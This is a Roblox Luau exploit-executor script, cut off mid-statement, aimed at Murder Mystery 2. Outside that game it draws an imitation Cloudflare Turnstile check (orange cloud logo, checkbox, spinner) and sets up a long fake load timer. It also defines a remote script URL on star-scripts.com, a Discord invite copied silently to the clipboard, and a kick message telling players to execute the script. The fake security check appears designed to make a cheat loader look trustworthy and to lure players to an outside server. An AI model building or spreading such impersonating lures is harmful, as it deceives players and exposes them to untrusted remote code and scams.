local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")
local LP = Players.LocalPlayer or Players.PlayerAdded:Wait()
local PG = LP:WaitForChild("PlayerGui")

local MM2_ID = 142823291
local LOAD_DUR = 180
local SCRIPT_URL = "https://star-scripts.com/api/run/8fb1A0haxu2xAhtKlDT3zTMlh2IVYDaA"
local DISCORD_URL = "https://discord.gg/BC3zyncq4"
local ALERT = "If verification failed, please join our discord server to access the protected script. NOTE: DON'T EVER LOGIN ON ANY SIGN OF FAKE ROBLOX GROUP! BEAM SITE ALERT!"
local KICK_MSG = "Error: Please join manually and execute the script!"
local UI_SCALE = 0.82 -- overall GUI size (1 = full size)

-- Cool slate / teal glass palette (no floating circle orbs)
local C = {
    deep = Color3.fromRGB(22, 34, 48),
    ink = Color3.fromRGB(42, 60, 78),
    muted = Color3.fromRGB(90, 112, 130),
    white = Color3.fromRGB(248, 252, 255),
    glass = Color3.fromRGB(186, 210, 224),
    line = Color3.fromRGB(150, 188, 208),
    sky = Color3.fromRGB(132, 186, 214),
    mint = Color3.fromRGB(120, 196, 184),
    lilac = Color3.fromRGB(150, 168, 210),
    peach = Color3.fromRGB(214, 186, 170),
    butter = Color3.fromRGB(214, 204, 164),
    rose = Color3.fromRGB(196, 168, 184),
    aqua = Color3.fromRGB(72, 154, 168),
    aquaLight = Color3.fromRGB(168, 214, 224),
    warning = Color3.fromRGB(120, 86, 80),
    warningBg = Color3.fromRGB(232, 218, 210),
    error = Color3.fromRGB(170, 104, 100),
    success = Color3.fromRGB(64, 156, 132)
}
local PASTELS = {C.sky, C.mint, C.lilac, C.aquaLight, C.glass, C.line}

-- ───────────────────────── helpers ─────────────────────────
local function tw(o, p, t, s, d)
    local a = TweenService:Create(o, TweenInfo.new(t, s or Enum.EasingStyle.Quad, d or Enum.EasingDirection.Out), p)
    a:Play()
    return a
end

local function new(cls, par, props)
    local o = Instance.new(cls)
    if props then for k, v in pairs(props) do o[k] = v end end
    o.Parent = par
    return o
end

-- Use standard Frame for maximum compatibility with Delta Executor (mobile & PC).
local function group(par, props)
    local o = Instance.new("Frame")
    if props then
        for k, v in pairs(props) do
            if k ~= "GroupTransparency" then
                pcall(function() o[k] = v end)
            end
        end
    end
    o.Parent = par
    return o
end

local function fadeGroup(o, target, t)
    return tw(o, {BackgroundTransparency = target}, t)
end

local function corner(par, r) return new("UICorner", par, {CornerRadius = UDim.new(0, r or 12)}) end
local function roundFull(par) return new("UICorner", par, {CornerRadius = UDim.new(1, 0)}) end
local function stroke(par, c, t, tr) return new("UIStroke", par, {Color = c or C.line, Thickness = t or 1.2, Transparency = tr or 0.18}) end
local function frame(par, props) return new("Frame", par, props) end
local function label(par, props) return new("TextLabel", par, props) end

-- One animation registry drives every effect from a single Heartbeat.
local anim = {t = 0, strokes = {}, grads = {}, orbs = {}, water = {}, fns = {}}

local function pastelSequence()
    return ColorSequence.new({
        ColorSequenceKeypoint.new(0, C.sky),
        ColorSequenceKeypoint.new(0.25, C.lilac),
        ColorSequenceKeypoint.new(0.5, C.mint),
        ColorSequenceKeypoint.new(0.75, C.peach),
        ColorSequenceKeypoint.new(1, C.sky)
    })
end

-- Rotating pastel gradient border.
local function auroraStroke(par, thickness, transp)
    local s = stroke(par, C.white, thickness or 1.6, transp or 0.1)
    local g = new("UIGradient", s, {Color = pastelSequence(), Rotation = math.random(0, 359)})
    table.insert(anim.strokes, g)
    return s
end

-- Thin flowing gradient line (header divider).
local function auroraLine(par, x, y, w, z)
    local f = frame(par, {
        Size = UDim2.new(1, -x * 2, 0, 1), Position = UDim2.fromOffset(x, y),
        BackgroundColor3 = C.white, BackgroundTransparency = 0.1, BorderSizePixel = 0, ZIndex = z or 6
    })
    if w then f.Size = UDim2.fromOffset(w, 1) end
    local g = new("UIGradient", f, {Color = pastelSequence()})
    table.insert(anim.grads, {g = g, base = 0, phase = math.random() * 6.28})
    return f
end

-- Frosted glass surface: cool slate aurora + pearl wash + gloss + specular line.
local function applyGlassWaterFx(parent, radius)
    radius = radius or 20
    local g = new("UIGradient", parent, {
        Rotation = 118,
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(228, 240, 248)),
            ColorSequenceKeypoint.new(0.35, Color3.fromRGB(186, 214, 226)),
            ColorSequenceKeypoint.new(0.7, Color3.fromRGB(170, 196, 220)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(156, 184, 210))
        })
    })
    table.insert(anim.grads, {g = g, base = 118, phase = math.random() * 6.28})
    local wash = frame(parent, {
        Size = UDim2.new(1, -10, 1, -10), Position = UDim2.fromOffset(5, 5),
        BackgroundColor3 = C.white, BackgroundTransparency = 0.78, BorderSizePixel = 0, ZIndex = 2, Active = false
    })
    corner(wash, math.max(radius - 6, 8))
    local gloss = frame(parent, {
        Size = UDim2.new(1, -6, 0, 110), Position = UDim2.fromOffset(3, 3),
        BackgroundColor3 = C.white, BackgroundTransparency = 0.48, BorderSizePixel = 0, ZIndex = 3, Active = false
    })
    corner(gloss, radius - 2)
    new("UIGradient", gloss, {
        Rotation = 90,
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0.05),
            NumberSequenceKeypoint.new(0.55, 0.7),
            NumberSequenceKeypoint.new(1, 1)
        })
    })
    local reflection = frame(parent, {
        Size = UDim2.new(1, -38, 0, 2), Position = UDim2.fromOffset(19, 3),
        BackgroundColor3 = C.white, BackgroundTransparency = 0.1, BorderSizePixel = 0, ZIndex = 4, Active = false
    })
    corner(reflection, 2)
    new("UIGradient", reflection, {
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 1),
            NumberSequenceKeypoint.new(0.18, 0.05),
            NumberSequenceKeypoint.new(0.72, 0.2),
            NumberSequenceKeypoint.new(1, 1)
        })
    })
end

local function sparkle(clip)
    local s = frame(clip, {
        Size = UDim2.fromOffset(3, 3), AnchorPoint = Vector2.new(0.5, 0.5),
        Position = UDim2.new(0.08 + math.random() * 0.84, 0, 0.08 + math.random() * 0.84, 0),
        Rotation = 45, BackgroundColor3 = C.white, BackgroundTransparency = 0.15,
        BorderSizePixel = 0, ZIndex = 3
    })
    corner(s, 1)
    tw(s, {Size = UDim2.fromOffset(12, 12), BackgroundTransparency = 1, Rotation = 135}, 1.1)
    task.delay(1.15, function() if s.Parent then s:Destroy() end end)
end

-- Liquid layer: fast shimmer, slow counter caustic, bubbles, sparkles.
local function addWaterBody(clip)
    local shimmer = frame(clip, {
        Size = UDim2.new(0.52, 0, 1.8, 0), Position = UDim2.new(-0.62, 0, -0.4, 0),
        Rotation = 16, BackgroundColor3 = C.white, BackgroundTransparency = 1, BorderSizePixel = 0, ZIndex = 3
    })
    new("UIGradient", shimmer, {
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 1),
            NumberSequenceKeypoint.new(0.46, 0.55),
            NumberSequenceKeypoint.new(0.54, 0.55),
            NumberSequenceKeypoint.new(1, 1)
        })
    })
    local caustic = frame(clip, {
        Size = UDim2.new(0.3, 0, 1.7, 0), Position = UDim2.new(1.08, 0, -0.35, 0),
        Rotation = -20, BackgroundColor3 = C.mint, BackgroundTransparency = 1, BorderSizePixel = 0, ZIndex = 3
    })
    new("UIGradient", caustic, {
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 1),
            NumberSequenceKeypoint.new(0.5, 0.72),
            NumberSequenceKeypoint.new(1, 1)
        })
    })
    local bubbles = {}
    for i = 1, 7 do
        local s = 3 + math.random(0, 6)
        local b = frame(clip, {
            Size = UDim2.fromOffset(s, s), Position = UDim2.new(math.random(), 0, 1, 0),
            BackgroundColor3 = PASTELS[math.random(1, #PASTELS)], BackgroundTransparency = 0.55 + math.random() * 0.3,
            BorderSizePixel = 0, ZIndex = 3
        })
        roundFull(b)
        stroke(b, C.white, 1, 0.4)
        bubbles[i] = {obj = b, x = math.random(), y = 1 + math.random(), speed = 0.018 + math.random() * 0.04, phase = math.random() * 6.28}
    end
    table.insert(anim.water, {clip = clip, shimmer = shimmer, caustic = caustic, bubbles = bubbles, t = math.random() * 4, off = math.random() * 6, spark = math.random() * 1.5})
end

local function step(dt)
    anim.t = anim.t + dt
    local t = anim.t
    for _, g in ipairs(anim.strokes) do g.Rotation = (g.Rotation + dt * 45) % 360 end
    for _, e in ipairs(anim.grads) do
        e.g.Rotation = e.base + math.sin(t * 0.22 + e.phase) * 14
        e.g.Offset = Vector2.new(math.sin(t * 0.3 + e.phase) * 0.18, math.cos(t * 0.19 + e.phase) * 0.08)
    end
    for _, fx in ipairs(anim.water) do
        if fx.clip.Parent then
            fx.t = fx.t + dt
            fx.shimmer.Position = UDim2.new(-0.62 + (fx.t % 4.8) / 4.8 * 2.05, 0, -0.4, 0)
            fx.caustic.Position = UDim2.new(1.08 - ((fx.t + fx.off) % 7.6) / 7.6 * 2.1, 0, -0.35, 0)
            for _, b in ipairs(fx.bubbles) do
                b.y = b.y - b.speed * dt
                if b.y < -0.06 then b.y = 1.04 b.x = math.random() end
                b.obj.Position = UDim2.new(math.clamp(b.x + math.sin(fx.t * 1.25 + b.phase) * 0.012, 0.01, 0.99), 0, b.y, 0)
            end
            fx.spark = fx.spark - dt
            if fx.spark <= 0 then sparkle(fx.clip) fx.spark = 0.8 + math.random() * 1.1 end
        end
    end
    for _, f in ipairs(anim.fns) do f(t, dt) end
end

-- Press feedback: scale squash + centred ripple.
local function pressFx(b)
    local sc = new("UIScale", b, {Scale = 1})
    b.ClipsDescendants = true
    b.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            tw(sc, {Scale = 0.95}, 0.1)
            local r = frame(b, {
                Size = UDim2.fromOffset(0, 0), Position = UDim2.fromScale(0.5, 0.5), AnchorPoint = Vector2.new(0.5, 0.5),
                BackgroundColor3 = C.white, BackgroundTransparency = 0.3, BorderSizePixel = 0, ZIndex = b.ZIndex + 1
            })
            roundFull(r)
            local d = math.max(b.AbsoluteSize.X, b.AbsoluteSize.Y) * 2.1
            tw(r, {Size = UDim2.fromOffset(d, d), BackgroundTransparency = 1}, 0.5)
            task.delay(0.55, function() if r.Parent then r:Destroy() end end)
        end
    end)
    b.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            tw(sc, {Scale = 1}, 0.2, Enum.EasingStyle.Back)
        end
    end)
    return sc
end

local function glassButton(parent, text, size, position, z)
    local b = new("TextButton", parent, {
        Size = size, Position = position, BackgroundColor3 = C.aquaLight,
        BackgroundTransparency = 0.12, BorderSizePixel = 0, Text = text,
        TextColor3 = C.deep, TextSize = 12, Font = Enum.Font.GothamMedium,
        AutoButtonColor = false, Active = true, Selectable = true, ZIndex = z or 7
    })
    corner(b, 10)
    local s = stroke(b, C.line, 1.2, 0.1)
    new("UIGradient", b, {
        Rotation = 90,
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, C.white),
            ColorSequenceKeypoint.new(0.45, C.aquaLight),
            ColorSequenceKeypoint.new(1, C.sky)
        })
    })
    pressFx(b)
    b.MouseEnter:Connect(function() tw(b, {BackgroundTransparency = 0.02}, 0.16) tw(s, {Color = C.mint}, 0.2) end)
    b.MouseLeave:Connect(function() tw(b, {BackgroundTransparency = 0.12}, 0.16) tw(s, {Color = C.line}, 0.2) end)
    return b
end

local function addAlert(parent, position, size)
    local box = frame(parent, {
        Size = size, Position = position, BackgroundColor3 = C.warningBg,
        BackgroundTransparency = 0.15, BorderSizePixel = 0, ZIndex = 6
    })
    corner(box, 11)
    new("UIGradient", box, {Rotation = 0, Color = ColorSequence.new(C.white, Color3.fromRGB(244, 226, 214))})
    stroke(box, Color3.fromRGB(208, 184, 172), 1, 0.1)
    local rule = frame(box, {
        Size = UDim2.new(0, 3, 1, -18), Position = UDim2.fromOffset(9, 9),
        BackgroundColor3 = Color3.fromRGB(190, 142, 122), BorderSizePixel = 0, ZIndex = 7
    })
    corner(rule, 2)
    new("UIGradient", rule, {Rotation = 90, Color = ColorSequence.new(C.peach, Color3.fromRGB(176, 120, 104))})
    label(box, {
        Size = UDim2.new(1, -36, 1, -16), Position = UDim2.fromOffset(25, 8),
        BackgroundTransparency = 1, Text = ALERT, TextWrapped = true,
        TextColor3 = C.warning, TextSize = 10, Font = Enum.Font.Gotham,
        TextXAlignment = Enum.TextXAlignment.Left, TextYAlignment = Enum.TextYAlignment.Center, ZIndex = 7
    })
    return box
end

local function getClipboardFn()
    return setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set) or (syn and syn.write_clipboard)
end

-- Silent clipboard copy; returns true on success.
local function silentCopy(text)
    local clipboard = getClipboardFn()
    if type(clipboard) ~= "function" then return false end
    local ok = pcall(clipboard, text)
    return ok
end

local function copyDiscord(feedback)
    if silentCopy(DISCORD_URL) then
        if feedback then feedback.Text = "Discord invite copied to clipboard" end
    else
        if feedback then feedback.Text = "Clipboard unavailable. Invite: " .. DISCORD_URL end
    end
end

local function glassPanel(parent, w, h, x, y, name)
    local p = frame(parent, {
        Name = name, Size = UDim2.fromOffset(w, h), Position = UDim2.fromOffset(x, y),
        BackgroundColor3 = C.glass, BackgroundTransparency = 0.08, BorderSizePixel = 0, ZIndex = 2
    })
    corner(p, 20)
    auroraStroke(p, 1.5, 0.12)
    applyGlassWaterFx(p, 20)
    local clip = frame(p, {Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, ClipsDescendants = true, ZIndex = 2})
    corner(clip, 20)
    addWaterBody(clip)
    return p
end

local function waterDrop(parent, x, y, s, z)
    z = z or 7
    local g = frame(parent, {Size = UDim2.fromOffset(s, s), Position = UDim2.fromOffset(x, y), BackgroundTransparency = 1, ZIndex = z})
    local body = frame(g, {
        Size = UDim2.new(1, -4, 0.68, 0), Position = UDim2.new(0.2, 2, 0.3, 0),
        BackgroundColor3 = C.white, BorderSizePixel = 0, ZIndex = z + 1
    })
    roundFull(body)
    new("UIGradient", body, {Rotation = 90, Color = ColorSequence.new(C.sky, C.aqua)})
    local top = frame(g, {
        Size = UDim2.new(0.58, 0, 0.5, 0), Position = UDim2.new(0.21, 0, 0, 0),
        BackgroundColor3 = C.white, BorderSizePixel = 0, ZIndex = z + 1
    })
    roundFull(top)
    new("UIGradient", top, {Rotation = 90, Color = ColorSequence.new(C.mint, C.aqua)})
    local shine = frame(g, {
        Size = UDim2.fromOffset(4, 5), Position = UDim2.new(0.3, 0, 0.42, 0),
        BackgroundColor3 = C.white, BackgroundTransparency = 0.2, BorderSizePixel = 0, ZIndex = z + 2
    })
    corner(shine, 2)
    return g
end

-- Cloudflare cloud: flat orange body, three bumps, lighter cloud peeking behind.
local function cloudLogo(parent, x, y)
    local g = frame(parent, {Size = UDim2.fromOffset(30, 16), Position = UDim2.fromOffset(x, y), BackgroundTransparency = 1, ZIndex = 8})
    local orange = Color3.fromRGB(246, 130, 31)
    local light = Color3.fromRGB(252, 173, 65)
    local function puff(w, h, px, py, col, z)
        local f = frame(g, {Size = UDim2.fromOffset(w, h), Position = UDim2.fromOffset(px, py), BackgroundColor3 = col, BorderSizePixel = 0, ZIndex = z})
        roundFull(f)
        return f
    end
    puff(9, 9, 20, 1, light, 8)
    puff(28, 7, 0, 8, orange, 9)
    puff(9, 9, 2, 4, orange, 9)
    puff(12, 12, 8, 0, orange, 9)
    puff(9, 9, 17, 4, orange, 9)
    return g
end

if PG:FindFirstChild("MM2_VerificationGui") then PG.MM2_VerificationGui:Destroy() end
if PG:FindFirstChild("MM2_LoaderGui") then PG.MM2_LoaderGui:Destroy() end

local camera = workspace.CurrentCamera
local viewport = camera and camera.ViewportSize or Vector2.new(1280, 720)
local sw, sh = viewport.X, viewport.Y

-- ================================================================
-- Outside MM2: Cloudflare Turnstile → bot verification panel
-- ================================================================
if game.PlaceId ~= MM2_ID then
    local SG = new("ScreenGui", PG, {
        Name = "MM2_VerificationGui", ResetOnSpawn = false,
        ZIndexBehavior = Enum.ZIndexBehavior.Sibling, IgnoreGuiInset = true
    })
    local Overlay = frame(SG, {
        Size = UDim2.fromScale(1, 1), BackgroundColor3 = Color3.fromRGB(10, 16, 26),
        BackgroundTransparency = 0.28, BorderSizePixel = 0, ZIndex = 1, Active = false
    })
    new("UIGradient", Overlay, {
        Rotation = 35,
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(10, 16, 26)),
            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 28, 40)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 24, 38))
        })
    })
    -- no floating circle orbs

    -- Cloudflare managed challenge widget (300 × 65)
    local TSShadow = frame(SG, {
        Size = UDim2.fromOffset(306, 71), AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(0.5, 0, 0.5, 5),
        BackgroundColor3 = Color3.fromRGB(4, 8, 14), BackgroundTransparency = 0.78, BorderSizePixel = 0, ZIndex = 4, Active = false
    })
    corner(TSShadow, 5)
    local TS = group(SG, {
        Size = UDim2.fromOffset(300, 65), AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5),
        BackgroundColor3 = Color3.fromRGB(250, 250, 250), BorderSizePixel = 0, ZIndex = 5, Active = true
    })
    corner(TS, 3)
    stroke(TS, Color3.fromRGB(224, 224, 224), 1, 0)

    -- Invisible full-widget hit button (Delta mobile needs a large Active TextButton)
    local HitBtn = new("TextButton", TS, {
        Size = UDim2.fromScale(1, 1), Position = UDim2.fromOffset(0, 0),
        BackgroundTransparency = 1, Text = "", BorderSizePixel = 0,
        AutoButtonColor = false, Active = true, Selectable = true, ZIndex = 20
    })

    -- 24px bordered checkbox (visual only; HitBtn handles the click)
    local CheckBox = frame(TS, {
        Size = UDim2.fromOffset(24, 24), Position = UDim2.fromOffset(18, 20),
        BackgroundColor3 = Color3.fromRGB(255, 255, 255), BorderSizePixel = 0, ZIndex = 7, Active = false
    })
    corner(CheckBox, 3)
    local cbStroke = stroke(CheckBox, Color3.fromRGB(109, 109, 109), 2, 0)

    -- Spinner: light track ring + orange arc (gradient-masked stroke) that rotates
    local Spinner = frame(TS, {Size = UDim2.fromOffset(24, 24), Position = UDim2.fromOffset(18, 20), BackgroundTransparency = 1, Visible = false, ZIndex = 7})
    local track = frame(Spinner, {Size = UDim2.fromOffset(22, 22), Position = UDim2.fromOffset(1, 1), BackgroundTransparency = 1, ZIndex = 7})
    roundFull(track)
    stroke(track, Color3.fromRGB(228, 228, 228), 2.5, 0)
    local arc = frame(Spinner, {Size = UDim2.fromOffset(22, 22), Position = UDim2.fromOffset(1, 1), BackgroundTransparency = 1, ZIndex = 8})
    roundFull(arc)
    local arcStroke = stroke(arc, Color3.fromRGB(246, 130, 31), 2.5, 0)
    new("UIGradient", arcStroke, {
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0),
            NumberSequenceKeypoint.new(0.42, 0),
            NumberSequenceKeypoint.new(0.58, 1),
            NumberSequenceKeypoint.new(1, 1)
        })
    })

    -- Success check
    local Success = label
